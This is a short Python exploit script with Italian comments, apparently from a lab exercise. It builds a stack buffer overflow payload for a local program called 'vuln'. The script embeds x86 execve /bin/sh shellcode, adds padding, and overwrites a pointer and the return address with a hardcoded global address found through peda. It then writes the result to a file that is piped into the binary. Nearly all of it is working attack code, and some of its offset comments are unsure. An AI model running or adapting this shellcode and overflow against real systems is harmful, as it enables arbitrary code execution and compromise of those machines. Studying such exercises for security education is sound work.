#note: exploit 1 con shellcode
#bisogna inserire l'injection vector nella stringa[260] (forse)

import os
import struct

shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")

#**comando: cat badfile - | ./vuln

stringa = 0x0804a080 #info variable su peda perche` e` una var globale

padding = 60 - len(shellcode)

#questi sono i 120 caratteri dei due buffer in cui metto anche lo shellcode
payload = "A"*60 #ovvero riempio buffer1
payload += shellcode #metto lo shellcode all'inizio di buffer
payload += "A"*padding #poi padding e arrivo subito prima di p

#tramite peda si capisce che bisogna metterne 6 per andare su p e sul ret addr ????
#dopo lo shellcode ho capito che servono 6 indirizzi di stringa

#in p metto l'indirizzo della stringa
payload += struct.pack("I", stringa)
#payload += struct.pack("I", stringa)
#payload += struct.pack("I", stringa)
#payload += struct.pack("I", stringa)
#payload += struct.pack("I", stringa)
#questo superava il ret address
#payload += struct.pack("I", stringa)

#si puo` fare la prova con un pattern per trovare la dimensione esatta
#payload += "AAA%AAsAABAA --> si fermava qui = 12
#$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA"

#cosi` arrivo al ret address
payload += "A"*12
#in ret address metto stringa
payload += struct.pack("I", stringa)

f = open("badfile-bof", "a")
f.write("%s" % payload)
f.close()
